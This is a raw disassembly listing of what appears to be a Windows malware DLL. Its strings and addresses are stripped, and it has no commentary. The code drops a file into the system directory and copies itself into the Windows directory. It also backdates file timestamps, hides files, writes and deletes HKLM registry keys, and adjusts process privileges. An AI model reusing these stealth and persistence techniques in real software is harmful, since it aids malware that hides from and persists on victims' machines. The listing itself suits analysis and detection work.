lea rcx [ rsp + 0x20 ]
mov [ rsp + 0x20 ] 0x94
call [ GetVersionExA@IAT ]
cmp [ rsp + 0x24 ] 0x5
seta dil
mov [ rbx + 0x18 ] edi
sub_18000a620
push rbp
push rsi
push rdi
push r12
sub rsp 0xf8
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0xe8 ] rax
mov r12 [ rcx + 0x8 ]
mov ebp r8d
mov rsi rdx
mov rdi rcx
test r12 r12
je r-xdata
xor eax eax
test rdx rdx
je r-xdata
cmp ebp 0x1
jb r-xdata
xor eax eax
mov [ rsp + 0xf0 ] rbx
xor ebx ebx
mov [ rsp + 0x50 ] rbx
mov [ rsp + 0x58 ] rax
cmp [ rcx + 0x18 ] eax
je r-xdata
mov rcx [ rcx + 0x10 ]
mov [ rsp + 0x48 ] ebp
mov [ rsp + 0x40 ] rdx
mov [ rsp + 0xd4 ] rax
mov [ rsp + 0xdc ] rax
mov [ rsp + 0x38 ] 0x14
lea rax [ rsp + 0xd0 ]
mov [ rsp + 0xd0 ] 0x400
mov [ rsp + 0xe0 ] 0x250
mov [ rsp + 0x30 ] rax
mov [ rsp + 0x28 ] 0x120003
mov [ rsp + 0xd8 ] 0x4400
lea r8d [ rbx + 0x68 ]
lea rcx [ rsp + 0x68 ]
xor edx edx
mov [ rsp + 0x60 ] rbx
call sub_18000bd10
mov rcx [ rdi + 0x10 ]
mov [ rsp + 0x48 ] 0x70
lea rax [ rsp + 0x60 ]
mov [ rsp + 0xc8 ] 0x1
mov [ rsp + 0x40 ] rax
mov [ rsp + 0x38 ] 0x70
lea rax [ rsp + 0x60 ]
mov [ rsp + 0x30 ] rax
mov [ rsp + 0xb8 ] rsi
mov [ rsp + 0xc0 ] rbp
mov [ rsp + 0x28 ] 0x12001b
mov [ rsp + 0x80 ] 0x752
mov [ rsp + 0x84 ] 0x2537
mov [ rsp + 0x90 ] 0x38
jmp r-xdata
mov rcx [ rsp + 0xe8 ]
xor rcx rsp
call sub_18000c060
add rsp 0xf8
pop r12
pop rdi
pop rsi
pop rbp
retn
lea rax [ rsp + 0x50 ]
xor r9d r9d
xor r8d r8d
xor edx edx
mov [ rsp + 0x20 ] rax
call r12
test eax eax
sete bl
mov eax ebx
mov rbx [ rsp + 0xf0 ]
jmp r-xdata
sub_18000a7b0
mov [ rsp + 0x10 ] rbx
push rdi
sub rsp 0xc0
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0xb0 ] rax
xor edx edx
mov rdi rcx
lea rcx [ rsp + 0x41 ]
lea r8d [ rdx + 0x63 ]
mov [ rsp + 0x40 ] 0x0
call sub_18000bd10
cmp [ rdi + 0x18 ] 0x0
lea rcx [ rsp + 0x40 ]
lea rdx [ r--data ]
jne r-xdata
call sub_18000c0dc
mov rcx [ rdi + 0x10 ]
cmp rcx 0xffffffffffffffff
je r-xdata
lea rdx [ r--data ]
xor ebx ebx
lea rcx [ rsp + 0x40 ]
xor r9d r9d
mov [ rsp + 0x30 ] rbx
lea r8d [ rbx + 0x3 ]
xor edx edx
mov [ rsp + 0x28 ] ebx
mov [ rsp + 0x20 ] 0x3
call [ CreateFileA@IAT ]
cmp rax 0xffffffffffffffff
mov [ rdi + 0x10 ] rax
setne bl
mov eax ebx
mov rcx [ rsp + 0xb0 ]
xor rcx rsp
call sub_18000c060
mov rbx [ rsp + 0xd8 ]
add rsp 0xc0
pop rdi
retn
call [ CloseHandle@IAT ]
sub_18000a870
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
mov ebx edx
mov rdi rcx
call sub_18000a5f0
test bl 0x1
je r-xdata
mov rax rdi
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
mov rcx rdi
call j_sub_18000ec1c
sub_18000a8a0
movzx edx [ rw-data ]
lea r8 [ rw-data ]
mov rax r8
test dl dl
je r-xdata
or eax 0xffffffff
retn
cmp dl cl
je r-xdata
sub rax r8
retn
movzx edx [ rax + 0x1 ]
inc rax
test dl dl
jne r-xdata
sub_18000a8d0
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rsi
mov [ rsp + 0x20 ] rdi
push r12
sub rsp 0x20
mov rbp rcx
or rcx 0xffffffffffffffff
xor eax eax
mov rdi rbp
mov r12 rdx
xor esi esi
[ rdi ]
not rcx
dec rcx
call sub_18000c27c
mov r11 rax
mov rbx rax
cmp [ rbp ] sil
je r-xdata
sub ebx r11d
mov rcx r11
movsxd rdx ebx
call sub_18000c1a8
mov [ r12 ] rax
mov eax ebx
lea r9 [ rbp + 0x2 ]
nop [ rax ] eax
movzx ecx [ r9 - 0x2 ]
call sub_18000a8a0
mov edi eax
test eax eax
js r-xdata
movzx ecx [ r9 - 0x1 ]
shl edi 0x6
call sub_18000a8a0
test eax eax
js r-xdata
or eax 0xffffffff
jmp r-xdata
movzx ecx [ r9 ]
add edi eax
shl edi 0x6
cmp cl 0x3d
jne r-xdata
mov rbx [ rsp + 0x30 ]
mov rbp [ rsp + 0x38 ]
mov rsi [ rsp + 0x40 ]
mov rdi [ rsp + 0x48 ]
add rsp 0x20
pop r12
retn
call sub_18000a8a0
test eax eax
js r-xdata
mov esi 0x1
jmp r-xdata
add edi eax
movzx ecx [ r9 + 0x1 ]
shl edi 0x6
cmp cl 0x3d
jne r-xdata
test esi esi
jne r-xdata
inc esi
cmp esi 0x3
jge r-xdata
call sub_18000a8a0
test eax eax
js r-xdata
cmp esi 0x2
jge r-xdata
jmp r-xdata
add edi eax
cmp esi 0x1
jge r-xdata
mov eax edi
sar eax 0x8
inc rbx
mov [ rbx - 0x1 ] al
mov eax edi
sar eax 0x10
inc rbx
mov [ rbx - 0x1 ] al
add r9 0x4
cmp [ r9 - 0x2 ] 0x0
jne r-xdata
mov [ rbx ] dil
inc rbx
test esi esi
jne r-xdata
Pass2
push rbx
sub rsp 0x4d0
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x4c0 ] rax
mov rbx rcx
xor eax eax
lea rcx [ rsp + 0x2b2 ]
xor edx edx
mov r8d 0x206
mov [ rsp + 0x2b0 ] ax
call sub_18000bd10
lea r8 [ rsp + 0x20 ]
lea rdx [ rsp + 0x2b0 ]
mov rcx rbx
mov [ rsp + 0x20 ] 0x104
call sub_18000baa0
lea rcx [ rsp + 0xd8 ]
xor edx edx
movups xmm0 [ r--data ]
movups xmm1 [ r--data ]
mov r8d 0x1d0
movaps [ rsp + 0xa0 ] xmm0
movaps [ rsp + 0xb0 ] xmm1
movups xmm0 [ r--data ]
movsd xmm1 [ r--data ]
movaps [ rsp + 0xc0 ] xmm0
movsd [ rsp + 0xd0 ] xmm1
call sub_18000bd10
lea rdx [ rsp + 0xa0 ]
lea rcx [ rsp + 0x2b0 ]
call sub_18000a420
xor edx edx
lea rcx [ rsp + 0x30 ]
lea r8d [ rdx + 0x70 ]
call sub_18000bd10
lea rax [ r--data ]
lea rcx [ r--data ]
mov [ rsp + 0x48 ] rax
lea rax [ r--data ]
mov [ rsp + 0x30 ] 0x70
mov [ rsp + 0x34 ] 0x40
mov [ rsp + 0x60 ] 0x5
mov [ rsp + 0x50 ] rax
mov [ rsp + 0x58 ] rax
call [ LoadLibraryW@IAT ]
lea rdx [ r--data ]
mov rcx rax
call [ GetProcAddress@IAT ]
lea rcx [ rsp + 0x30 ]
call rax
test eax eax
je r-xdata
mov eax 0x1
mov rcx [ rsp + 0x4c0 ]
xor rcx rsp
call sub_18000c060
add rsp 0x4d0
pop rbx
retn
mov rcx [ rsp + 0x98 ]
test rcx rcx
je r-xdata
or edx 0xffffffff
call [ WaitForSingleObject@IAT ]
mov rcx [ rsp + 0x98 ]
call [ CloseHandle@IAT ]
sub_18000abf0
mov [ rsp + 0x10 ] rbx
mov [ rsp + 0x18 ] rsi
mov [ rsp + 0x20 ] rdi
push rbp
lea rbp [ rsp - 0xc0 ]
sub rsp 0x1c0
mov rax [ rw-data ]
xor rax rsp
mov [ rbp + 0xb0 ] rax
xor eax eax
mov rbx rcx
lea rcx [ rbp - 0x7f ]
xor edx edx
mov r8d 0x12b
mov [ rsp + 0x68 ] rax
mov [ rsp + 0x70 ] rax
mov [ rbp - 0x80 ] al
call sub_18000bd10
lea rcx [ rbp - 0x80 ]
mov edx 0x12c
call [ GetSystemDirectoryA@IAT ]
xor esi esi
xor eax eax
or rcx 0xffffffffffffffff
mov [ rsp + 0x30 ] rsi
lea rdi [ rbp - 0x80 ]
[ rdi ]
mov rax [ r--data ]
lea r8d [ rsi + 0x1 ]
mov [ rdi - 0x1 ] rax
movzx eax [ r--data ]
lea rcx [ rbp - 0x80 ]
xor r9d r9d
mov edx 0x80000000
mov [ rsp + 0x28 ] 0x80
mov [ rdi + 0x7 ] al
mov [ rsp + 0x50 ] rsi
mov [ rsp + 0x48 ] rsi
mov [ rsp + 0x40 ] rsi
mov [ rsp + 0x20 ] 0x3
call [ CreateFileA@IAT ]
mov rdi rax
test rax rax
je r-xdata
mov eax 0x7d4
lea rdx [ rsp + 0x58 ]
lea rcx [ rsp + 0x68 ]
mov [ rsp + 0x68 ] ax
mov eax 0x8
mov [ rsp + 0x70 ] 0x14
mov [ rsp + 0x6a ] ax
mov eax 0x11
mov [ rsp + 0x6e ] ax
call [ SystemTimeToFileTime@IAT ]
lea rdx [ rsp + 0x60 ]
lea rcx [ rsp + 0x58 ]
call [ LocalFileTimeToFileTime@IAT ]
mov rdx [ rsp + 0x60 ]
mov [ rsp + 0x50 ] rdx
mov [ rsp + 0x40 ] rdx
mov [ rsp + 0x48 ] rdx
lea r9 [ rsp + 0x48 ]
lea r8 [ rsp + 0x40 ]
lea rdx [ rsp + 0x50 ]
mov rcx rax
call [ GetFileTime@IAT ]
mov rcx rdi
call [ CloseHandle@IAT ]
jmp r-xdata
mov edx 0x7
mov rcx rbx
call [ SetFileAttributesA@IAT ]
mov rcx [ rbp + 0xb0 ]
xor rcx rsp
call sub_18000c060
lea r11 [ rsp + 0x1c0 ]
mov rbx [ r11 + 0x18 ]
mov rsi [ r11 + 0x20 ]
mov rdi [ r11 + 0x28 ]
mov rsp r11
pop rbp
retn
lea r9 [ rsp + 0x48 ]
lea r8 [ rsp + 0x40 ]
lea rdx [ rsp + 0x50 ]
mov rcx rax
call [ SetFileTime@IAT ]
mov rcx rdi
call [ CloseHandle@IAT ]
xor r9d r9d
mov [ rsp + 0x30 ] rsi
mov edx 0x40000000
lea r8d [ r9 + 0x2 ]
mov rcx rbx
mov [ rsp + 0x28 ] 0x80
mov [ rsp + 0x20 ] 0x3
call [ CreateFileA@IAT ]
mov rdi rax
test rax rax
je r-xdata
DFunc
push rbp
lea rbp [ rsp - 0x1c0 ]
sub rsp 0x2c0
mov [ rsp + 0x58 ] 0xfffffffffffffffe
mov [ rsp + 0x2d0 ] rdi
mov rax [ rw-data ]
xor rax rsp
mov [ rbp + 0x1b0 ] rax
mov [ rbp + 0xa0 ] 0x0
xor edx edx
mov r8d 0x103
lea rcx [ rbp + 0xa1 ]
call sub_18000bd10
mov r8d 0x104
lea rdx [ rbp + 0xa0 ]
xor ecx ecx
call [ GetModuleFileNameA@IAT ]
lea rcx [ rbp + 0xa0 ]
call sub_18001b974
mov rax [ r--data ]
mov [ rsp + 0x20 ] rax
mov rax [ r--data ]
mov [ rsp + 0x28 ] rax
mov eax [ r--data ]
mov [ rsp + 0x30 ] eax
movzx eax [ r--data ]
mov [ rsp + 0x34 ] al
mov rax 0x726574696c7073
mov [ rsp + 0x60 ] rax
mov [ rsp + 0x70 ] 0x0
xor edx edx
mov r8d 0x12b
lea rcx [ rsp + 0x71 ]
call sub_18000bd10
mov edx 0x12c
lea rcx [ rsp + 0x70 ]
call [ GetSystemDirectoryA@IAT ]
lea rdi [ rsp + 0x70 ]
xor eax eax
or rcx 0xffffffffffffffff
[ rdi ]
lea rdx [ rsp + 0x20 ]
xor ecx ecx
nop [ rax + rax ] ax
movzx eax [ rdx + rcx ]
mov [ rdi + rcx - 0x1 ] al
inc rcx
test al al
jne r-xdata
lea rcx [ rsp + 0x70 ]
call sub_18000bb40
lea r8 [ rsp + 0x70 ]
mov edx 0x3c00
lea rcx [ rw-data ]
call sub_18000bba0
call sub_18000b9c0
lea rdx [ rsp + 0x60 ]
lea rcx [ rsp + 0x70 ]
call sub_18000b590
mov edx 0x80
lea rcx [ rsp + 0x70 ]
call [ SetFileAttributesA@IAT ]
lea rcx [ rsp + 0x70 ]
call [ DeleteFileA@IAT ]
lea rcx [ rsp + 0x38 ]
call sub_18000a530
nop
lea rcx [ rsp + 0x38 ]
call sub_18000a7b0
test eax eax
jne r-xdata
mov ecx 0x4
call j_sub_18000ca24
mov rdi rax
test rax rax
je r-xdata
jmp r-xdata
lea rcx [ rsp + 0x38 ]
call sub_18000a5f0
mov eax 0x1
mov rcx [ rbp + 0x1b0 ]
xor rcx rsp
call sub_18000c060
mov rdi [ rsp + 0x2d0 ]
add rsp 0x2c0
pop rbp
retn
mov eax 0x2000
mov [ rdi ] ax
xor eax eax
mov [ rdi + 0x2 ] ax
lea r8d [ rax + 0x4 ]
mov rdx rdi
lea rcx [ rsp + 0x38 ]
call sub_18000a620
mov rcx rdi
call j_sub_18000ec1c#2
nop
sub_18000afa0
push rbx
sub rsp 0x20
xor r8d r8d
lea r9 [ r--data ]
xor ecx ecx
lea edx [ r8 + 0x1 ]
call [ CreateEventA@IAT ]
mov rbx rax
test rax rax
je r-xdata
xor eax eax
add rsp 0x20
pop rbx
retn
call [ GetLastError@IAT ]
cmp eax 0xb7
jne r-xdata
mov rcx rbx
call [ CloseHandle@IAT ]
mov eax 0x1
add rsp 0x20
pop rbx
retn
sub_18000aff0
sub rsp 0xd8
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0xc0 ] rax
mov eax [ rw-data ]
test eax eax
jne r-xdata
mov rcx [ rsp + 0xc0 ]
xor rcx rsp
call sub_18000c060
add rsp 0xd8
retn
lea rcx [ rsp + 0x24 ]
xor edx edx
mov r8d 0x98
call sub_18000bd10
lea rcx [ rsp + 0x20 ]
mov [ rsp + 0x20 ] 0x9c
call [ GetVersionExA@IAT ]
test eax eax
jne r-xdata
mov eax [ rsp + 0x30 ]
dec eax
je r-xdata
lea rcx [ rsp + 0x20 ]
mov [ rsp + 0x20 ] 0x94
call [ GetVersionExA@IAT ]
test eax eax
je r-xdata
xor eax eax
dec eax
jne r-xdata
mov [ rw-data ] 0x0
mov eax [ rsp + 0x24 ]
cmp eax 0x5
jne r-xdata
cmp eax 0x6
jne r-xdata
mov eax [ rsp + 0x28 ]
cmp eax 0x2
jne r-xdata
cmp eax 0x4
ja r-xdata
mov eax [ rsp + 0x28 ]
test eax eax
jne r-xdata
cmp eax 0x1
jne r-xdata
mov [ rw-data ] 0x40
mov eax 0x40
mov rcx [ rsp + 0xc0 ]
xor rcx rsp
call sub_18000c060
add rsp 0xd8
retn
mov [ rw-data ] 0x8
mov eax 0x8
mov rcx [ rsp + 0xc0 ]
xor rcx rsp
call sub_18000c060
add rsp 0xd8
retn
cmp eax 0x1
jne r-xdata
cmp [ rsp + 0xba ] 0x1
jne r-xdata
test eax eax
jne r-xdata
mov [ rw-data ] 0x20
mov eax 0x20
mov rcx [ rsp + 0xc0 ]
xor rcx rsp
call sub_18000c060
add rsp 0xd8
retn
mov [ rw-data ] 0x100
mov eax 0x100
mov rcx [ rsp + 0xc0 ]
xor rcx rsp
call sub_18000c060
add rsp 0xd8
retn
mov [ rw-data ] 0x200
mov eax 0x200
mov rcx [ rsp + 0xc0 ]
xor rcx rsp
call sub_18000c060
add rsp 0xd8
retn
mov [ rw-data ] 0x80
mov eax 0x80
mov rcx [ rsp + 0xc0 ]
xor rcx rsp
call sub_18000c060
add rsp 0xd8
retn
mov [ rw-data ] 0x10
mov eax 0x10
mov rcx [ rsp + 0xc0 ]
xor rcx rsp
call sub_18000c060
add rsp 0xd8
retn
IsPassSucess2
push rbx
sub rsp 0x3a0
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x390 ] rax
mov rbx rcx
lea rcx [ rsp + 0x281 ]
xor edx edx
mov r8d 0x103
mov [ rsp + 0x280 ] 0x0
call sub_18000bd10
lea rdx [ rsp + 0x280 ]
mov r8d 0x104
xor ecx ecx
call [ GetModuleFileNameA@IAT ]
lea rcx [ rsp + 0x280 ]
call sub_18001b974
lea rdx [ r--data ]
lea rcx [ rsp + 0x280 ]
call sub_18000bf74
test rax rax
je r-xdata
mov rcx [ rsp + 0x390 ]
xor rcx rsp
call sub_18000c060
add rsp 0x3a0
pop rbx
retn
lea rcx [ rsp + 0x21 ]
xor edx edx
mov r8d 0x12b
mov [ rsp + 0x3b8 ] rdi
mov [ rsp + 0x20 ] 0x0
call sub_18000bd10
lea rcx [ rsp + 0x20 ]
mov edx 0x12c
call [ GetWindowsDirectoryA@IAT ]
xor eax eax
or rcx 0xffffffffffffffff
lea rdi [ rsp + 0x20 ]
[ rdi ]
mov rax [ r--data ]
lea rcx [ rsp + 0x20 ]
mov [ rdi - 0x1 ] rax
movzx eax [ r--data ]
mov [ rdi + 0x7 ] ax
movzx eax [ r--data ]
mov [ rdi + 0x9 ] al
call [ DeleteFileA@IAT ]
lea rcx [ rsp + 0x20 ]
call sub_18000bb70
test eax eax
je r-xdata
lea rdx [ rsp + 0x20 ]
mov r8d 0x1
mov rcx rbx
call [ CopyFileA@IAT ]
lea rcx [ rsp + 0x20 ]
call sub_18000abf0
xor ecx ecx
call [ ExitProcess@IAT ]
lea rcx [ rsp + 0x151 ]
xor edx edx
mov r8d 0x12b
mov [ rsp + 0x150 ] 0x0
call sub_18000bd10
lea rdx [ rsp + 0x20 ]
lea rcx [ rsp + 0x150 ]
mov r8d 0x12c
call sub_18000be10
lea rcx [ rsp + 0x150 ]
mov edx 0x5c
call sub_18000c334
or rcx 0xffffffffffffffff
lea rdi [ rsp + 0x150 ]
mov [ rax + 0x1 ] 0x0
xor eax eax
lea rdx [ rsp + 0x150 ]
[ rdi ]
mov rax [ r--data ]
lea rcx [ rsp + 0x20 ]
mov [ rdi - 0x1 ] rax
mov eax [ r--data ]
mov [ rdi + 0x7 ] eax
movzx eax [ r--data ]
mov [ rdi + 0xb ] al
call sub_18000c3f4
sub_18000b3c0
sub rsp 0x28
cmp [ rw-data ] 0x0
je r-xdata
mov eax 0x1
add rsp 0x28
retn
nop [ rax ] eax
lea rcx [ rw-data ]
call sub_1800173a0
call sub_18000aff0
cmp eax 0x40
ja r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
mov [ rw-data ] 0x0
call DFunc
call sub_18000afa0
test eax eax
je r-xdata
mov eax 0x1
add rsp 0x28
retn
ExportFunc
sub rsp 0x258
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x240 ] rax
mov rdx rcx
lea rcx [ rsp + 0x38 ]
mov r8d 0x204
call sub_18000c440
cmp [ rsp + 0x238 ] 0x2
jne r-xdata
lea rcx [ rsp + 0x40 ]
call sub_18000aa10
lea rcx [ rw-data ]
mov r8d 0x3ff
mov rdx rax
call sub_18000be10
lea r8 [ r--data ]
lea rdx [ r--data ]
lea rcx [ rw-data ]
call sub_18000a270
lea rdx [ rw-data ]
lea rcx [ r--data ]
call sub_18000a140
lea rdx [ rw-data ]
lea rcx [ r--data ]
call sub_18000a140
lea rdx [ rw-data ]
lea rcx [ r--data ]
call sub_18000a140
lea rdx [ rw-data ]
lea rcx [ r--data ]
call sub_18000a140
lea rdx [ rw-data ]
lea rcx [ r--data ]
call sub_18000a140
lea rdx [ rw-data ]
lea rcx [ r--data ]
call sub_18000a140
lea rdx [ rw-data ]
lea rcx [ r--data ]
call sub_18000a140
xor ecx ecx
lea rax [ rsp + 0x30 ]
mov [ rsp + 0x28 ] rax
lea r8 [ sub_18000b3c0 ]
xor r9d r9d
xor edx edx
mov [ rsp + 0x20 ] ecx
mov [ rw-data ] 0x16
mov [ rw-data ] 0xa
mov [ rsp + 0x30 ] ecx
call [ CreateThread@IAT ]
mov rax [ rw-data ]
test rax rax
je r-xdata
mov eax 0x1
mov rcx [ rsp + 0x240 ]
xor rcx rsp
call sub_18000c060
add rsp 0x258
retn
call rax
jmp r-xdata
sub_18000b590
mov [ rsp + 0x18 ] rbx
push rbp
push rsi
push rdi
lea rbp [ rsp - 0x50 ]
sub rsp 0x150
mov rax [ rw-data ]
xor rax rsp
mov [ rbp + 0x40 ] rax
mov rsi rcx
lea rcx [ r--data ]
mov rdi rdx
call [ LoadLibraryA@IAT ]
mov rbx rax
test rax rax
jne r-xdata
lea rdx [ r--data ]
mov rcx rax
call [ GetProcAddress@IAT ]
lea rdx [ r--data ]
mov rcx rbx
mov [ rw-data ] rax
call [ GetProcAddress@IAT ]
lea rdx [ r--data ]
mov rcx rbx
mov [ rw-data ] rax
call [ GetProcAddress@IAT ]
lea rdx [ r--data ]
lea rcx [ rsp + 0x70 ]
mov r8 rdi
mov [ rw-data ] rax
call sub_18000c0dc
lea r8 [ rsp + 0x38 ]
lea rdx [ rsp + 0x70 ]
movsxd rcx eax
mov [ rsp + rcx + 0x70 ] 0x0
mov rcx 0xffffffff80000002
call [ RegCreateKeyA@IAT ]
test eax eax
jne r-xdata
xor eax eax
jmp r-xdata
mov rcx [ rsp + 0x38 ]
lea rax [ rsp + 0x30 ]
lea rdx [ r--data ]
mov r9d 0x4
xor r8d r8d
mov [ rsp + 0x28 ] 0x4
mov [ rsp + 0x30 ] 0x1
mov [ rsp + 0x40 ] 0x1
mov [ rsp + 0x20 ] rax
call [ RegSetValueExA@IAT ]
mov rcx [ rsp + 0x38 ]
lea rax [ rsp + 0x30 ]
lea rdx [ r--data ]
mov r9d 0x4
xor r8d r8d
mov [ rsp + 0x28 ] 0x4
mov [ rsp + 0x20 ] rax
call [ RegSetValueExA@IAT ]
mov rcx [ rsp + 0x38 ]
lea rax [ rsp + 0x40 ]
lea rdx [ r--data ]
mov r9d 0x4
xor r8d r8d
mov [ rsp + 0x28 ] 0x4
mov [ rsp + 0x20 ] rax
call [ RegSetValueExA@IAT ]
lea rdx [ r--data ]
lea rcx [ rsp + 0x70 ]
mov r8 rsi
call sub_18000c0dc
lea rdx [ r--data ]
mov r9d 0x1
movsxd rcx eax
mov [ rsp + 0x28 ] eax
lea rax [ rsp + 0x70 ]
mov [ rsp + rcx + 0x70 ] 0x0
mov rcx [ rsp + 0x38 ]
xor r8d r8d
mov [ rsp + 0x20 ] rax
call [ RegSetValueExA@IAT ]
mov rcx [ rsp + 0x38 ]
call [ RegCloseKey@IAT ]
lea rdx [ r--data ]
lea rcx [ rsp + 0x70 ]
mov r8 rdi
call sub_18000c0dc
lea rdx [ rsp + 0x48 ]
mov r8d 0x1
movsxd rcx eax
mov [ rsp + 0x48 ] ax
mov [ rsp + rcx + 0x70 ] 0x0
lea rcx [ rsp + 0x70 ]
mov [ rsp + 0x50 ] rcx
lea rcx [ rsp + 0x58 ]
call [ rw-data ]
lea rcx [ rsp + 0x58 ]
call [ rw-data ]
lea r8 [ r--data ]
lea rdx [ r--data ]
lea rcx [ rsp + 0x70 ]
mov r9 rdi
mov ebx eax
call sub_18000c0dc
lea rdx [ rsp + 0x70 ]
movsxd rcx eax
mov [ rsp + rcx + 0x70 ] 0x0
mov rcx 0xffffffff80000002
call [ RegDeleteKeyA@IAT ]
lea r8 [ r--data ]
lea rdx [ r--data ]
lea rcx [ rsp + 0x70 ]
mov r9 rdi
call sub_18000c0dc
mov rcx 0xffffffff80000002
movsxd rdx eax
mov [ rsp + rdx + 0x70 ] 0x0
lea rdx [ rsp + 0x70 ]
call [ RegDeleteKeyA@IAT ]
mov r9 rdi
lea r8 [ r--data ]
lea rdx [ r--data ]
lea rcx [ rsp + 0x70 ]
call sub_18000c0dc
mov rcx 0xffffffff80000002
movsxd rdx eax
mov [ rsp + rdx + 0x70 ] 0x0
lea rdx [ rsp + 0x70 ]
call [ RegDeleteKeyA@IAT ]
mov eax ebx
mov rcx [ rbp + 0x40 ]
xor rcx rsp
call sub_18000c060
mov rbx [ rsp + 0x180 ]
add rsp 0x150
pop rdi
pop rsi
pop rbp
retn
sub_18000b850
push rbx
push rbp
push r12
push r13
sub rsp 0x78
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x60 ] rax
mov r13 rcx
lea rcx [ r--data ]
mov ebp r8d
mov r12 rdx
call [ LoadLibraryA@IAT ]
mov rbx rax
test rax rax
je r-xdata
mov rcx [ rsp + 0x60 ]
xor rcx rsp
call sub_18000c060
add rsp 0x78
pop r13
pop r12
pop rbp
pop rbx
retn
lea rdx [ r--data ]
mov rcx rax
mov [ rsp + 0x70 ] rdi
call [ GetProcAddress@IAT ]
mov rcx rbx
mov rdi rax
test rax rax
jne r-xdata
lea rdx [ r--data ]
mov [ rsp + 0xb0 ] rsi
call [ GetProcAddress@IAT ]
mov rsi rax
test rax rax
jne r-xdata
call [ FreeLibrary@IAT ]
xor eax eax
jmp r-xdata
lea r8 [ rsp + 0x38 ]
mov rdx r12
xor ecx ecx
mov [ rsp + 0x30 ] 0x10
call rdi
test eax eax
je r-xdata
mov rcx rbx
call [ FreeLibrary@IAT ]
mov rdi [ rsp + 0x70 ]
xor eax eax
jmp r-xdata
mov rax [ rsp + 0x38 ]
xor ebx ebx
lea r8 [ rsp + 0x50 ]
mov [ rsp + 0x54 ] rax
lea rax [ rsp + 0x30 ]
lea r9d [ rbx + 0x10 ]
mov [ rsp + 0x28 ] rax
lea rax [ rsp + 0x40 ]
xor edx edx
mov rcx r13
mov [ rsp + 0x50 ] 0x1
mov [ rsp + 0x5c ] ebx
mov [ rsp + 0x20 ] rax
call rsi
call [ GetLastError@IAT ]
test eax eax
jne r-xdata
mov rsi [ rsp + 0xb0 ]
mov rax [ rsp + 0x38 ]
mov [ rsp + 0x40 ] 0x1
mov [ rsp + 0x44 ] rax
test ebp ebp
je r-xdata
and [ rsp + 0x4c ] 0xfffffffd
or [ rsp + 0x4c ] 0x2
jmp r-xdata
mov r9d [ rsp + 0x30 ]
lea r8 [ rsp + 0x40 ]
xor edx edx
mov rcx r13
mov [ rsp + 0x28 ] rbx
mov [ rsp + 0x20 ] rbx
call rsi
call [ GetLastError@IAT ]
test eax eax
sete bl
mov eax ebx
sub_18000b9c0
push rbx
sub rsp 0x20
lea rcx [ r--data ]
call [ LoadLibraryA@IAT ]
mov rbx rax
test rax rax
jne r-xdata
lea rdx [ r--data ]
mov rcx rax
mov [ rsp + 0x38 ] rdi
call [ GetProcAddress@IAT ]
mov rdi rax
test rax rax
jne r-xdata
add rsp 0x20
pop rbx
retn
call [ GetCurrentProcess@IAT ]
lea r8 [ rsp + 0x30 ]
mov edx 0x28
mov rcx rax
call rdi
mov rcx rbx
test eax eax
je r-xdata
mov rcx rbx
call [ FreeLibrary@IAT ]
mov rdi [ rsp + 0x38 ]
xor eax eax
add rsp 0x20
pop rbx
retn
call [ FreeLibrary@IAT ]
mov rcx [ rsp + 0x30 ]
lea rdx [ r--data ]
mov r8d 0x1
call sub_18000b850
mov rcx [ rsp + 0x30 ]
lea rdx [ r--data ]
mov r8d 0x1
call sub_18000b850
mov rcx [ rsp + 0x30 ]
lea rdx [ r--data ]
mov r8d 0x1
call sub_18000b850
mov rcx [ rsp + 0x30 ]
call [ CloseHandle@IAT ]
mov rdi [ rsp + 0x38 ]
mov eax 0x1
add rsp 0x20
pop rbx
retn
sub_18000baa0
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rsi
mov [ rsp + 0x20 ] rdi
push r12
sub rsp 0x30
mov rbp rcx
xor eax eax
or rcx 0xffffffffffffffff
mov rbx r8
mov rsi rdx
mov [ rsp + 0x28 ] eax
mov rdi rbp
mov r8 rbp
xor edx edx
[ rdi ]
mov [ rsp + 0x20 ] rax
not rcx
lea r9d [ rcx - 0x1 ]
lea r12 [ rcx - 0x1 ]
xor ecx ecx
call [ MultiByteToWideChar@IAT ]
mov edi eax
test eax eax
je r-xdata
mov [ rbx ] eax
cmp eax [ rbx ]
jg r-xdata
mov [ rsp + 0x28 ] eax
mov r9d r12d
mov r8 rbp
xor edx edx
xor ecx ecx
mov [ rsp + 0x20 ] rsi
call [ MultiByteToWideChar@IAT ]
mov [ rbx ] edi
test eax eax
je r-xdata
xor eax eax
mov rax rsi
jmp r-xdata
mov rbx [ rsp + 0x40 ]
mov rbp [ rsp + 0x48 ]
mov rsi [ rsp + 0x50 ]
mov rdi [ rsp + 0x58 ]
add rsp 0x30
pop r12
retn
sub_18000bba0
mov [ rsp + 0x18 ] rbx
push rdi
sub rsp 0x40
mov rax r8
mov edi edx
mov rbx rcx
test rcx rcx
jne r-xdata
xor r9d r9d
mov [ rsp + 0x30 ] 0x0
mov edx 0x40000000
lea r8d [ r9 + 0x1 ]
mov rcx rax
mov [ rsp + 0x28 ] 0x80
mov [ rsp + 0x58 ] rsi
mov [ rsp + 0x20 ] 0x2
call [ CreateFileA@IAT ]
mov rsi rax
cmp rax 0xffffffffffffffff
jne r-xdata
xor eax eax
mov rbx [ rsp + 0x60 ]
add rsp 0x40
pop rdi
retn
lea r9 [ rsp + 0x50 ]
mov r8d edi
mov rdx rbx
mov rcx rax
mov [ rsp + 0x50 ] 0x0
mov [ rsp + 0x20 ] 0x0
call [ WriteFile@IAT ]
mov rcx rsi
call [ CloseHandle@IAT ]
mov rsi [ rsp + 0x58 ]
mov rbx [ rsp + 0x60 ]
mov eax 0x1
add rsp 0x40
pop rdi
retn
xor eax eax
mov rsi [ rsp + 0x58 ]
mov rbx [ rsp + 0x60 ]
add rsp 0x40
pop rdi
retn
sub_18000bc70
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
lea rax [ r--data ]
mov ebx edx
mov rdi rcx
